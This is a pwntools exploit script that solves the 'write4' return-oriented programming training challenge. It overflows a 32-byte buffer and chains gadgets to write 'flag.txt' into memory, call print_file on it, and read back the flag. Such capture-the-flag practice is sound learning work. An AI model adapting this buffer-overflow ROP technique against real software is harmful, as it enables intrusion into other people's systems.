from pwn import *

elf = ELF("write4")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32

def main():
    memory = elf.bss(0x800)

    payload = flat \
    ({
        BUFFER_SIZE + context.bytes: \
        [
            # write file name to memory
            rop.r14.address, memory, b'flag.txt',
            elf.symbols.usefulGadgets,

            # call target function with file name as arg
            rop.rdi.address,
            memory,
            elf.symbols.print_file,
        ]
    })

    c = connection()
    c.sendlineafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
